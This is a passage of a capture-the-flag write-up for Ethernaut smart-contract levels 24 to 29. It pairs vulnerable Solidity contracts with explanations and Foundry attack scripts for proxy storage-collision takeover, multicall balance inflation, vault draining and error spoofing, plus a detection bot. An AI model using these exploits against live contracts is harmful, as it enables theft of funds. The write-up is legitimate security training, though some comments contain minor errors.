$ forge script script/DexTwoSolve.s.sol:DexTwoSolve --rpc-url $RPC_URL --broadcast
```

# 24 Puzzle Wallet

`PuzzleWallet.sol`

```javascript
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
pragma experimental ABIEncoderV2;

import "./helpers/UpgradeableProxy-08.sol";

contract PuzzleProxy is UpgradeableProxy {
    address public pendingAdmin;
    address public admin;

    constructor(address _admin, address _implementation, bytes memory _initData) UpgradeableProxy(_implementation, _initData) {
        admin = _admin;
    }

    modifier onlyAdmin {
      require(msg.sender == admin, "Caller is not the admin");
      _;
    }

    function proposeNewAdmin(address _newAdmin) external {
        pendingAdmin = _newAdmin;
    }

    function approveNewAdmin(address _expectedAdmin) external onlyAdmin {
        require(pendingAdmin == _expectedAdmin, "Expected new admin by the current admin is not the pending admin");
        admin = pendingAdmin;
    }

    function upgradeTo(address _newImplementation) external onlyAdmin {
        _upgradeTo(_newImplementation);
    }
}

contract PuzzleWallet {
    address public owner;
    uint256 public maxBalance;
    mapping(address => bool) public whitelisted;
    mapping(address => uint256) public balances;

    function init(uint256 _maxBalance) public {
        require(maxBalance == 0, "Already initialized");
        maxBalance = _maxBalance;
        owner = msg.sender;
    }

    modifier onlyWhitelisted {
        require(whitelisted[msg.sender], "Not whitelisted");
        _;
    }

    function setMaxBalance(uint256 _maxBalance) external onlyWhitelisted {
      require(address(this).balance == 0, "Contract balance is not 0");
      maxBalance = _maxBalance;
    }

    function addToWhitelist(address addr) external {
        require(msg.sender == owner, "Not the owner");
        whitelisted[addr] = true;
    }

    function deposit() external payable onlyWhitelisted {
      require(address(this).balance <= maxBalance, "Max balance reached");
      balances[msg.sender] += msg.value;
    }

    function execute(address to, uint256 value, bytes calldata data) external payable onlyWhitelisted {
        require(balances[msg.sender] >= value, "Insufficient balance");
        balances[msg.sender] -= value;
        (bool success, ) = to.call{ value: value }(data);
        require(success, "Execution failed");
    }

    function multicall(bytes[] calldata data) external payable onlyWhitelisted {
        bool depositCalled = false;
        for (uint256 i = 0; i < data.length; i++) {
            bytes memory _data = data[i];
            bytes4 selector;
            assembly {
                selector := mload(add(_data, 32))
            }
            if (selector == this.deposit.selector) {
                require(!depositCalled, "Deposit can only be called once");
                // Protect against reusing msg.value
                depositCalled = true;
            }
            (bool success, ) = address(this).delegatecall(data[i]);
            require(success, "Error while delegating call");
        }
    }
}
```

- Goal

1.   You'll need to hijack this wallet to become the admin of the proxy.


- Solution

1. PuzzleProxy is a proxy contract and PuzzleWallet is an implementation contract.
2. Calls to PuzzleProxy will be forwarded to the PuzzleWallet through delegatecall.
3. Recall that `delegatecall` updates the storage of the caller contract. So, the storage layout should not possess any collisons.
4. Here, the storage layout of the two contracts are not matched. It may lead to storage collisions. 
5. Lets understand the goal of the challenge. We need to become the admin of the proxy contract. 
6. We can propose a new admin which will update the `pendingAdmin` variable in PuzzleProxy as well as the `owner` inside PuzzleWallet. Because of storage collision.
7. Then call the `addToWhiteList()` with our Attacker address to be able to call other functions of PuzzleWallet.
8. To override the `admin` variable in PuzzleProxy contract we have to change the `maxPrice` variable to address of our Attacker.
9. To update `maxPrice` we need to drain all the funds of the the PuzzleWallet. Initially it has 0.001 ether, We can able to deposit some ether and withdraw the same amount of ether only using the `execute()` function.
10. If we somehow able to pass this `require(balances[msg.sender] >= value, "Insufficient balance");` check we can withdraw more ether from wallet.
11. To do so, we need to send 0.001 ether only to the wallet, but we need to update the `balance[msg.sender]` to double of it. So that we can withdraw() 0.002 ether from the wallet. So that wallet balance will be zero.
12. We can use the `multicall()` function to do this, we call the `multicall()` with 0.001 ether and pass the function signature of the `deposit()` so that our balance will become 0.001 ether and balance of wallet will be 0.002 ether.
13. We cant call `deposit()` twice in a single call by passing calldata as [signature of `deposit` + signature of `deposit`]. As there is a check to catch this case.
14. But we can send the singature of the `deposit()` and a call to `multicall()` again with the `deposit()` signature.
15. That is we are calling multicall with a `deposit()` calldata along with multicall calldata with `deposit()` signature. i.e, a nested multicall.
16. This will modify the `balance[msg.sender]` twice so that it will become 0.00 ether, but the actual wallet balance is 0.002.
17. Now we have enough `balance[msg.sender]` to pass the check done in `execute()` function.
18. So, now we can withdraw 0.002 ether from wallet, therefore the wallet balance becomes zero.


`PuzzleWalletSolve.s.sol`

```javascript
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import "../src/PuzzleWallet.sol";

contract PuzzleWalletSolve is Script{
    PuzzleProxy public proxy = PuzzleProxy(payable(0xf8393D543826B4240CEb1Dc159aa83d6a879D8c2));
    PuzzleWallet public wallet = PuzzleWallet(0xf8393D543826B4240CEb1Dc159aa83d6a879D8c2);

    function run() external{
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        console.log("Wallet Owner  :", wallet.owner());
        console.log("Proxy Admin :", proxy.admin());
        console.log("Wallet Max Balance : ", wallet.maxBalance());
        console.log("Proxy Pending Admin : ", proxy.pendingAdmin());
        console.log("Wallet balance : ", address(wallet).balance);

        Attack attack = new Attack();

        attack.exploit{value: 0.001 ether}();


        console.log("Wallet Owner  :", wallet.owner());
        console.log("Proxy Admin :", proxy.admin());
        console.log("Wallet Max Balance : ", wallet.maxBalance());
        console.log("Proxy Pending Admin : ", proxy.pendingAdmin());
        console.log("Wallet balance : ", address(wallet).balance);

        vm.stopBroadcast();
    }
}


contract Attack {
    PuzzleProxy public proxy = PuzzleProxy(payable(0xf8393D543826B4240CEb1Dc159aa83d6a879D8c2));
    PuzzleWallet public wallet = PuzzleWallet(0xf8393D543826B4240CEb1Dc159aa83d6a879D8c2);

    function exploit() payable public{
        proxy.proposeNewAdmin(address(this)); // Changes pendingAdmin in Proxy and overwrites owner in Wallet

        wallet.addToWhitelist(address(this));

        // To set maxPrice ==> Wallet Balance should be 0, But Initiall Wallet Balance : 1000000000000000 (0.001 ETH)
        // Make Wallet Balance 0

        // use multicall to call deposit and multicall again with 0.001 eth

        bytes[] memory _depositSelector = new bytes[](1) ;
        _depositSelector[0] = abi.encodeWithSelector(wallet.deposit.selector);

        
        bytes[] memory _nestedMulti = new bytes[](2);
        _nestedMulti[0] = abi.encodeWithSelector(wallet.deposit.selector);
        _nestedMulti[1] = abi.encodeWithSelector(wallet.multicall.selector, _depositSelector);  // multicall calldata
        // [deposit selector, multicall selector [deposit] ]
        wallet.multicall{value: 0.001 ether}(_nestedMulti);

        // Wallet Balance : 0.002 ETH
        // Balance[msg.sender] = Balance[Attacker] = 0.003 ETH

        // Call Execute function with amount 0.002

        wallet.execute(address(this), 0.002 ether, "");


        // Now Wallet Balance ==> 0

        // wallet.setMaxBalance(uint256(uint160(address(this))));
        
        wallet.setMaxBalance(uint256(uint160(address(0x699BceEbD59a5b52bB586C737cD7ba636f3Fe602)))); // sets proxyAdmin
    }

    receive() payable external{}
}
/*
            // Proxy                            // Wallet
        address public pendingAdmin;    |  address public owner;
        address public admin;           |  uint256 public maxBalance;
*/

```

To run script : 

```bash
$ source .env
$ forge script script/PuzzleWalletSolve.s.sol:PuzzleWalletSolve --rpc-url $RPC_URL --broadcast
```

# 25 Motorbike

`Motorbike.sol`

```javascript
// SPDX-License-Identifier: MIT

pragma solidity <0.7.0;

import "openzeppelin-contracts-06/utils/Address.sol";
import "openzeppelin-contracts-06/proxy/Initializable.sol";

contract Motorbike {
    // keccak-256 hash of "eip1967.proxy.implementation" subtracted by 1
    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
    
    struct AddressSlot {
        address value;
    }
    
    // Initializes the upgradeable proxy with an initial implementation specified by `_logic`.
    constructor(address _logic) public {
        require(Address.isContract(_logic), "ERC1967: new implementation is not a contract");
        _getAddressSlot(_IMPLEMENTATION_SLOT).value = _logic;
        (bool success,) = _logic.delegatecall(
            abi.encodeWithSignature("initialize()")
        );
        require(success, "Call failed");
    }

    // Delegates the current call to `implementation`.
    function _delegate(address implementation) internal virtual {
        // solhint-disable-next-line no-inline-assembly
        assembly {
            calldatacopy(0, 0, calldatasize())
            let result := delegatecall(gas(), implementation, 0, calldatasize(), 0, 0)
            returndatacopy(0, 0, returndatasize())
            switch result
            case 0 { revert(0, returndatasize()) }
            default { return(0, returndatasize()) }
        }
    }

    // Fallback function that delegates calls to the address returned by `_implementation()`. 
    // Will run if no other function in the contract matches the call data
    fallback () external payable virtual {
        _delegate(_getAddressSlot(_IMPLEMENTATION_SLOT).value);
    }

    // Returns an `AddressSlot` with member `value` located at `slot`.
    function _getAddressSlot(bytes32 slot) internal pure returns (AddressSlot storage r) {
        assembly {
            r_slot := slot
        }
    }
}

contract Engine is Initializable {
    // keccak-256 hash of "eip1967.proxy.implementation" subtracted by 1
    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;

    address public upgrader;
    uint256 public horsePower;

    struct AddressSlot {
        address value;
    }

    function initialize() external initializer {
        horsePower = 1000;
        upgrader = msg.sender;
    }

    // Upgrade the implementation of the proxy to `newImplementation`
    // subsequently execute the function call
    function upgradeToAndCall(address newImplementation, bytes memory data) external payable {
        _authorizeUpgrade();
        _upgradeToAndCall(newImplementation, data);
    }

    // Restrict to upgrader role
    function _authorizeUpgrade() internal view {
        require(msg.sender == upgrader, "Can't upgrade");
    }

    // Perform implementation upgrade with security checks for UUPS proxies, and additional setup call.
    function _upgradeToAndCall(
        address newImplementation,
        bytes memory data
    ) internal {
        // Initial upgrade and setup call
        _setImplementation(newImplementation);
        if (data.length > 0) {
            (bool success,) = newImplementation.delegatecall(data);
            require(success, "Call failed");
        }
    }
    
    // Stores a new address in the EIP1967 implementation slot.
    function _setImplementation(address newImplementation) private {
        require(Address.isContract(newImplementation), "ERC1967: new implementation is not a contract");
        
        AddressSlot storage r;
        assembly {
            r_slot := _IMPLEMENTATION_SLOT
        }
        r.value = newImplementation;
    }
}
```

- Goal

1. Would you be able to selfdestruct its engine and make the motorbike unusable ?


- Solution

1. This is another upgradeable proxy contract setup. Motorbike contract is the proxy contract which forwards the calls to the implementation contract Engine.
2. This time no storage collison is happened. 
3. We need to change the `updrader` of the Engine contract and `selfdestruct` the Engine contract.
4. I dont see any function that selfdestructs Engine contract. So, we have to write an Attack contract which has the selfdestruct function and change the implementation address.
5. We see only one time the `upgrader` was assigned inside Engine contract, that is inside `initialize()` function. And this initialize function was called inside the constructor of the Motobike.
6. But observe that this call was done using `delegatecall`, which is done in the context of the Motorbike. Not the Engine contract.
7. This means the `initialize()` function can be called again as the `intializer` modfier not updated.
8. By calling `intialize()` we will become the updrader of the Engine contract. 
9. Now, we can update the implementation addres by calling `upgradeToAndCall()` function and pass the data as the signature of the `destructEngine()` function to be called by the Engine contract. 
10. This will destruct the Engine contract, because the call was done using `delegatecall` so the storage of the Engine will be affected.

`MotorbikeSolve.s.sol`


To run script : 

```bash
$ source .env
$ forge script script/MotorbikeSolve.s.sol:MotorbikeSolve --rpc-url $RPC_URL --broadcast
```

# 26 Double Entry Point

`DoubleEntryPoint.sol`

```javascript
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "openzeppelin-contracts/contracts/access/Ownable.sol";
import "openzeppelin-contracts/contracts/token/ERC20/ERC20.sol";

interface DelegateERC20 {
  function delegateTransfer(address to, uint256 value, address origSender) external returns (bool);
}

interface IDetectionBot {
    function handleTransaction(address user, bytes calldata msgData) external;
}

interface IForta {
    function setDetectionBot(address detectionBotAddress) external;
    function notify(address user, bytes calldata msgData) external;
    function raiseAlert(address user) external;
}

contract Forta is IForta {
  mapping(address => IDetectionBot) public usersDetectionBots;
  mapping(address => uint256) public botRaisedAlerts;

  function setDetectionBot(address detectionBotAddress) external override {
      usersDetectionBots[msg.sender] = IDetectionBot(detectionBotAddress);
  }

  function notify(address user, bytes calldata msgData) external override {
    if(address(usersDetectionBots[user]) == address(0)) return;
    try usersDetectionBots[user].handleTransaction(user, msgData) {
        return;
    } catch {}
  }

  function raiseAlert(address user) external override {
      if(address(usersDetectionBots[user]) != msg.sender) return;
      botRaisedAlerts[msg.sender] += 1;
  } 
}

contract CryptoVault {
    address public sweptTokensRecipient;
    IERC20 public underlying;

    constructor(address recipient) {
        sweptTokensRecipient = recipient;
    }

    function setUnderlying(address latestToken) public {
        require(address(underlying) == address(0), "Already set");
        underlying = IERC20(latestToken);
    }

    /*
    ...
    */

    function sweepToken(IERC20 token) public {
        require(token != underlying, "Can't transfer underlying token");
        token.transfer(sweptTokensRecipient, token.balanceOf(address(this)));
    }
}

contract LegacyToken is ERC20("LegacyToken", "LGT"), Ownable(address(0)) { // added address(0) to escape compiler errors
    DelegateERC20 public delegate;

    function mint(address to, uint256 amount) public onlyOwner {
        _mint(to, amount);
    }

    function delegateToNewContract(DelegateERC20 newContract) public onlyOwner {
        delegate = newContract;
    }

    function transfer(address to, uint256 value) public override returns (bool) {
        if (address(delegate) == address(0)) {
            return super.transfer(to, value);
        } else {
            return delegate.delegateTransfer(to, value, msg.sender);
        }
    }
}

contract DoubleEntryPoint is ERC20("DoubleEntryPointToken", "DET"), DelegateERC20, Ownable (address(0)) { // added address(0) to escape compiler errors
    address public cryptoVault;
    address public player;
    address public delegatedFrom;
    Forta public forta;

    constructor(address legacyToken, address vaultAddress, address fortaAddress, address playerAddress) {
        delegatedFrom = legacyToken;
        forta = Forta(fortaAddress);
        player = playerAddress;
        cryptoVault = vaultAddress;
        _mint(cryptoVault, 100 ether);
    }

    modifier onlyDelegateFrom() {
        require(msg.sender == delegatedFrom, "Not legacy contract");
        _;
    }

    modifier fortaNotify() {
        address detectionBot = address(forta.usersDetectionBots(player));

        // Cache old number of bot alerts
        uint256 previousValue = forta.botRaisedAlerts(detectionBot);

        // Notify Forta
        forta.notify(player, msg.data);

        // Continue execution
        _;

        // Check if alarms have been raised
        if(forta.botRaisedAlerts(detectionBot) > previousValue) revert("Alert has been triggered, reverting");
    }

    function delegateTransfer(
        address to,
        uint256 value,
        address origSender
    ) public override onlyDelegateFrom fortaNotify returns (bool) {
        _transfer(origSender, to, value);
        return true;
    }
}
```

- Goal

1. Drain the underlying token balance of CryptoVault and Write a detection bot to catch this bug.

- Solution

1. There are four contract in total CryptoVault, DoubleEntryPoint, LegacyToken and Forta.
2. CryptoVault implemented `sweepToken()` function which allows us to sweep all the tokens from the CryptoVault except the `underlying` tokens.
3. The underlying token is an instance of the DET token implemented in the DoubleEntryPoint contract definition and the CryptoVault holds 100 units of it. Additionally the CryptoVault also holds 100 of LegacyToken LGT.
4. LegacyToken is simple ERC20 token which is already deployed and minted 100 tokens for the CryptoVault. 
5. LegacyToken also have function `transfer()` which is where the catch is,
```javascript
 function transfer(address to, uint256 value) public override returns (bool) {
    if (address(delegate) == address(0)) {
        return super.transfer(to, value);
    } else {
        return delegate.delegateTransfer(to, value, msg.sender);
    }
}
```
6. I checked that the `delegate` is the address of the DoubleEntryPoint Token. And it is assigned to delegate in LegacyToken contract.
7. So, whenever we call the `transfer()` in LegacyToken it will call the `delegate.delegateTransfer(to, value, msg.sender);`.
8. Here the `delegate` == `DET` address. Which means the LegacyToken contract is calling the `delegateTransfer()` function of DoubleEntryPoint contract.
9. Lets see what this function is doing,
```javascript
function delegateTransfer(
    address to,
    uint256 value,
    address origSender
) public override onlyDelegateFrom fortaNotify returns (bool) {
    _transfer(origSender, to, value);
    return true;
}
```
10. Its sending the `DET` tokens to the `to` address from the `origSender` of `value`. Lets see what are these values.
11. When this function executes it transfers DET tokens of `origSender` to the `to` address. CryptoVault holds 100 DET tokens.
12. So, if the `origSender` is CryptoVault and the call to `delegateTransfer()` was made by `LegacyToken` and no alerts from the `fortaNotify` will transfer DET tokens from CryptoVault. (Ignore fortaNotify as they are not yet implmented)
13. The `delegateTransfer()` is called by LegacyToken contract from the `transfer()` function. The `origSender` is the `msg.sender` of transfer() function in LegacyToken.
14. So, we have to make the CryptoVault to call the `transfer()` function of the LegacyToken. 
15. We see the one `transfer()` call is made on the `token` by CryptoVault inside `sweepToken()` function.
```javascript
function sweepToken(IERC20 token) public {
    require(token != underlying, "Can't transfer underlying token");
    token.transfer(sweptTokensRecipient, token.balanceOf(address(this)));
}
```
16. To make the LegacyToken `tranfer()` called by the CryptoVault, we need to pass the LegacyToken instance to the `sweepToken()` function. 
17. Now the CryptoVault balance of DET token becomes zero.
18. We identified the bug and sweeped out the DET tokens of the CryptoVault.
19. Now we have to write a `detectionbot` to catch this bug. We are given with `Forta` interface which can be used to build the bot.
20. We have to build a bot that raises an alert when we see any transaction that transfers DET tokens from CryptoVault.
21. The `msg.data` that received at `fortNotify()`,
```
data = <delegateTransfer() signature> <to> <value> <origSender>
```
22. If we access `msg.data` inside `handleTransaction()`,
```
msg.data = <handleTransaction() signature> <user> <data>
```
23. We need to extract `origSender` from the `msg.data` inside `handleTransaction()` function implemented in our bot contract.
24. Lets see how the calldata at `handleTransaction()` is looks like,
```
0x00 : handleTransaction signature[4 bytes]
0x04 : 0000....0000 // <user> address
0x24 : 0000....0000 // offset of the <data>
0x44 : 0000....0000 // length of the <data>
0x64 : 0000....0000 // <data>
    <data>
    0x64 : <delegateTransfer() signature> [4 bytes]
    0x68 : 0000....0000 // <to> address
    0x88 : 0000....0000 // <value>
    0xA8 : 0000....0000 // <origSender>
```
25. So, the `origSender` is from the `0xA8` byte of the `msg.data` inside `handleTransaction()` function.
26. We can use `calldataload` opcode to access the `origSender`. And if the origSender is equals to CryptoVault then raise an alert.
27. Now our bot is ready, we have to deploy it and register the bot at `Forta` contract.
28. And that's enough to solve this challenge.

`DoubleEntryPointSolve.s.sol`

```javascript
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";

import "../src/DoubleEntryPoint.sol";

contract DoubleEntryPointSolve is Script {
    DoubleEntryPoint public det = DoubleEntryPoint(0xaf69EbD36B5465a0764Db0FE4dE0040780F6533C);
    function run() external{
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        address cryptovault = det.cryptoVault();
        address player = det.player();
        address delegatedFrom = det.delegatedFrom(); // Legacy Token Address
        console.log("CryptoVault : ", cryptovault);
        console.log("Player : ", player);
        console.log("LGT : ", delegatedFrom);

        LegacyToken lgt = LegacyToken(delegatedFrom);
        CryptoVault cv = CryptoVault(cryptovault);

        console.log("CryptoVault balance of DET : ", det.balanceOf(cryptovault));
        console.log("CryptoVault balance of LGT : ", lgt.balanceOf(cryptovault));

        console.log("Delegate of LGT : ", address(lgt.delegate()));
        console.log("DET : ", address(det));
        console.log("Both are same");

        Forta forta = det.forta();

        console.log("registering bot.........");

        DetectionBot bot = new DetectionBot();

        forta.setDetectionBot(address(bot));

        console.log("BOT ALERTS Before exploit : ",forta.botRaisedAlerts(address(bot)));

        console.log("Exploiting DET...........");

        // new Attack().exploit();  // reverts because bot detects the exploit

        console.log("CryptoVault balance of DET : ", det.balanceOf(cryptovault));

        console.log("BOT ALERTS After exploit : ",forta.botRaisedAlerts(address(bot)));

        vm.stopBroadcast();
    }
}

contract Attack{
    DoubleEntryPoint public det = DoubleEntryPoint(0xaf69EbD36B5465a0764Db0FE4dE0040780F6533C);
    address public  cryptovault = det.cryptoVault();
    address public player = det.player();
    address public delegatedFrom = det.delegatedFrom(); // Legacy Token Address
    function exploit() public{
        CryptoVault cv = CryptoVault(cryptovault);

        cv.sweepToken(IERC20(delegatedFrom));

    }

}

contract DetectionBot{

    DoubleEntryPoint public det = DoubleEntryPoint(0xaf69EbD36B5465a0764Db0FE4dE0040780F6533C);
    address public  cryptovault = det.cryptoVault();

    function handleTransaction(address user, bytes calldata msgData) external {
        address origSender;

        assembly {
            origSender := calldataload(0xa8)
        }

        if (origSender ==cryptovault ){
            Forta(msg.sender).raiseAlert(user); // raise alert of Forta contract
        }
    }
}

```

To run script : 

```bash
$ source .env
$ forge script script/DoubleEntryPointSolve.s.sol:DoubleEntryPointSolve --rpc-url $RPC_URL --broadcast
```

# 27 Good Samaritan

`GoodSamaritan.sol`

```javascript
// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0 <0.9.0;

import "openzeppelin-contracts/contracts/utils/Address.sol";

contract GoodSamaritan {
    Wallet public wallet;
    Coin public coin;

    constructor() {
        wallet = new Wallet();
        coin = new Coin(address(wallet));

        wallet.setCoin(coin);
    }

    function requestDonation() external returns(bool enoughBalance){
        // donate 10 coins to requester
        try wallet.donate10(msg.sender) {
            return true;
        } catch (bytes memory err) {
            if (keccak256(abi.encodeWithSignature("NotEnoughBalance()")) == keccak256(err)) {
                // send the coins left
                wallet.transferRemainder(msg.sender);
                return false;
            }
        }
    }
}

contract Coin {
    using Address for address;

    mapping(address => uint256) public balances;

    error InsufficientBalance(uint256 current, uint256 required);

    constructor(address wallet_) {
        // one million coins for Good Samaritan initially
        balances[wallet_] = 10**6;
    }

    function transfer(address dest_, uint256 amount_) external {
        uint256 currentBalance = balances[msg.sender];

        // transfer only occurs if balance is enough
        if(amount_ <= currentBalance) {
            balances[msg.sender] -= amount_;
            balances[dest_] += amount_;

            //if(dest_.isContract()) { 
            if (dest_.code.length != 0){
                // notify contract 
                INotifyable(dest_).notify(amount_);
            }
        } else {
            revert InsufficientBalance(currentBalance, amount_);
        }
    }
}

contract Wallet {
    // The owner of the wallet instance
    address public owner;

    Coin public coin;

    error OnlyOwner();
    error NotEnoughBalance();

    modifier onlyOwner() {
        if(msg.sender != owner) {
            revert OnlyOwner();
        }
        _;
    }

    constructor() {
        owner = msg.sender;
    }

    function donate10(address dest_) external onlyOwner {
        // check balance left
        if (coin.balances(address(this)) < 10) {
            revert NotEnoughBalance();
        } else {
            // donate 10 coins
            coin.transfer(dest_, 10);
        }
    }

    function transferRemainder(address dest_) external onlyOwner {
        // transfer balance left
        coin.transfer(dest_, coin.balances(address(this)));
    }

    function setCoin(Coin coin_) external onlyOwner {
        coin = coin_;
    }
}

interface INotifyable {
    function notify(uint256 amount) external;
}
```

- Goal

1. Would you be able to drain all the balance from his Wallet?


- Solution

1. There in total three contract are given to us. `GoodSamaritan` contract deployes `Wallet` and `Coin` contracts.
2. Good samaritan will be the `owner` of the `Wallet` contract. And the wallet contract will have 10**6 Coin balances. 
3. We are given with the GoodSamaritan instance address. We can able to call the `requestDonation()` function to get 10 coins from the GoodSamaritan's Wallet.
4. One call to `requestDonation()` will get 10 coins only. To drain all the coins of the Wallet we need to call the `requestDonation()` function `100000` times which requires more gas.
5. Instead we can try to invoke the `withdrawRemainder()` function which will send all the coins at a time.
6. The `withdrawRemainder()` is called when the `wallet.donate10(msg.sender)` returns error `NotEnoughBalance()` defined inside Wallet contract.
7. GoodSamaritan contract expects the error from the Wallet contract only. But as per the solidity docs, the error may be raised and bubbled up by any intermediary contract. That means we cannot predict the origin of the error.
8. So, can we raise error by ourself to the GoodSamaritan..? yes, When transfering 10 coins to the sender inside the `Coin` contract it notifies the sender if the sender is a contract.
9. This means it calls to our `msg.sender`, now we can implement the `notify()` function inside our Attack contract and revert with the `NotEnoughBalance()` error when receiving the 10 coins.
10. We should revert the `NotEnoughBalance()` error when only receiving the 10 coins not when the GoodSamaritan sending whole coins. 
11. For this I used the amount parameter sent by the Coin contract through the notify call.
12. Now GoodSamaritan gets the error `NotEnoughBalance()` when it sends 10 coins to us, immediately it will send whole coins to us.


`GoodSamaritanSolve.s.sol`

```javascript
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";

import "../src/GoodSamaritan.sol";

contract GoodSamaritanSolve is Script {
    GoodSamaritan public gs = GoodSamaritan(0x5887fc48Bd661cCD104998d3BB556b1879aC4cC2);
    function run() external{
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        console.log("Wallet Address : ", address(gs.wallet()));
        console.log("Coin Address : ", address(gs.coin()));
        console.log("Balance of Wallet", gs.coin().balances(address(gs.wallet())));

        new Attack().exploit();

        console.log("Balance of Wallet", gs.coin().balances(address(gs.wallet())));

        vm.stopBroadcast();
    }
}

contract Attack{
    error NotEnoughBalance();
    GoodSamaritan public gs = GoodSamaritan(0x5887fc48Bd661cCD104998d3BB556b1879aC4cC2);

    function exploit() public{
        gs.requestDonation();
    }

    function notify(uint256 amount) external{
        if(amount <= 10){ // only revert when receiving 10 coins
            revert NotEnoughBalance();
        }
    }
}
```

To run script : 

```bash
$ source .env
$ forge script script/GoodSamaritanSolve.s.sol:GoodSamaritanSolve --rpc-url $RPC_URL --broadcast
```

# 28 Gatekeeper Three

`GatekeeperThree.sol`

```javascript
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract SimpleTrick {
  GatekeeperThree public target;
  address public trick;
  uint private password = block.timestamp;

  constructor (address payable _target) {
    target = GatekeeperThree(_target);
  }
    
  function checkPassword(uint _password) public returns (bool) {
    if (_password == password) {
      return true;
    }
    password = block.timestamp;
    return false;
  }
    
  function trickInit() public {
    trick = address(this);
  }
    
  function trickyTrick() public {
    if (address(this) == msg.sender && address(this) != trick) {
      target.getAllowance(password);
    }
  }
}

contract GatekeeperThree {
  address public owner;
  address public entrant;
  bool public allowEntrance;

  SimpleTrick public trick;

  function construct0r() public {
      owner = msg.sender;
  }

  modifier gateOne() {
    require(msg.sender == owner);
    require(tx.origin != owner);
    _;
  }

  modifier gateTwo() {
    require(allowEntrance == true);
    _;
  }

  modifier gateThree() {
    if (address(this).balance > 0.001 ether && payable(owner).send(0.001 ether) == false) {
      _;
    }
  }

  function getAllowance(uint _password) public {
    if (trick.checkPassword(_password)) {
        allowEntrance = true;
    }
  }

  function createTrick() public {
    trick = new SimpleTrick(payable(address(this)));
    trick.trickInit();
  }

  function enter() public gateOne gateTwo gateThree {
    entrant = tx.origin;
  }

  receive () external payable {}
}
```

- Goal

1. Cope with gates and become an entrant.


- Solution

1. Similar to GatekeeperOne and GatekeeperTwo we need to pass the three gate checks by the modifiers when calling the `enter()` function.
2. `gateOne()` can be bypassed if we are the owner of the contract and we need call from a contract.
3. To be be the owner we can call the `construct0r()` function its not the actual constructor(), so we can be the owner after calling it.
4. `gateTwo()` will be passed if we managed to change the `allowEntrance` value to true. To do it, we need to call the `getAllowance()` function with the right password defined inside SimpleTrick contract. 
5. So, we need to deploy a SimpleTrick contract first, we can do this by calling `createTrick()` function.
6. After that we need to find the password stored inside SimpleTrick contract. We can do this by using `vm.load` cheatcode or we can find the password inside our Attack contract.
7. Because the password is the `block.timestamp` which will be same during a transaction. If we deploy the SimpeToken and get the block.timestamp inside same call, the block.timestamp will be the password for us.
8. Callling `getAllowance()` with this value will pass the gateTwo.
9. For `gateThree()` the balance of the GatekeeperThree should be greater than 0.001 ether and when the GatekeeperThree sends 0.001 ether to owner it should return false.
10. Remember owner is out attack contract, GatekeeperThree sending ether using `send` call. `send` call will return `false` when the transaction fails.
11. So, we have to deny the ether sent by the GatekeeperThree. To do this, I haven't implemented any fallback or receive function inside my Attack contract.
12. For this reason the send will return false to GatekeeperThree contract and now we will able to register as entrant.

`GatekeeperThreeSolve.s.sol`

```javascript
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";

import "../src/GatekeeperThree.sol";

contract GatekeeperThreeSolve is Script {
    GatekeeperThree public gate = GatekeeperThree(payable(0x152e56fe5FEC16f910Ea83294dD321a0c8380193));
    function run() external{
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        console.log("Gate Owner : ", gate.owner());

        // address trick = gate.trick().trick();
        // console.log("Trick Address : ", trick);
        // bytes32 _password = vm.load(trick, bytes32(uint(2)));
        // uint password = uint(_password);
        // console.log("Password : ", password);

        Attack attack = new Attack{value: 0.002 ether}();
        attack.exploit();
        
        console.log("Allow Entrance : ", gate.allowEntrance());
        console.log("Gate Owner : ", gate.owner());
        console.log("Entrant : ", gate.entrant());
        vm.stopBroadcast();
    }
}

contract Attack{
    GatekeeperThree public gate = GatekeeperThree(payable(0x152e56fe5FEC16f910Ea83294dD321a0c8380193));

    constructor() payable{}
    function exploit() public {
        gate.construct0r();

        gate.createTrick();
        gate.getAllowance(block.timestamp);

        (bool success, ) = payable(address(gate)).call{value : address(this).balance}("");
        require(success, "Tx Failed");

        gate.enter();

    }
}
```

To run script : 

```bash
$ source .env
$ forge script script/GatekeeperThreeSolve.s.sol:GatekeeperThreeSolve --rpc-url $RPC_URL --broadcast
```

# 29 Switch

`Switch.sol`

```javascript
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Switch {
    bool public switchOn; // switch is off
    bytes4 public offSelector = bytes4(keccak256("turnSwitchOff()"));

     modifier onlyThis() {
        require(msg.sender == address(this), "Only the contract can call this");
        _;
    }

    modifier onlyOff() {
        // we use a complex data type to put in memory
        bytes32[1] memory selector;
        // check that the calldata at position 68 (location of _data)
        assembly {
            calldatacopy(selector, 68, 4) // grab function selector from calldata
        }
        require(
            selector[0] == offSelector,
            "Can only call the turnOffSwitch function"
        );
        _;
    }

    function flipSwitch(bytes memory _data) public onlyOff {
        (bool success, ) = address(this).call(_data);
        require(success, "call failed :(");
    }

    function turnSwitchOn() public onlyThis {
        switchOn = true;
    }

    function turnSwitchOff() public onlyThis {
        switchOn = false;
    }

}
```

- Goal

1. Just have to flip the switch.

- Solution

1. Switch contract has three functions `turnSwitchOff()`, `turnSwitchOn()` and `flipSwitch()`. In which we can only able to call flipSwitch function.
2. By using this flipSwitch only we have to call the `turnSwitchOn()` function. For this we need to pass the calldata for the function call `turnSwitchOn()`. 
3. But If we pass the `turnSwitchOn()` calldata to the `flipSwitch()` it will be reverted by `onlyOff` modifier. 
4. Because, onlyOff is checking that the calldata's 68 to 72 bytes should only contain the signature of the `turnSwitchOff()` function. 
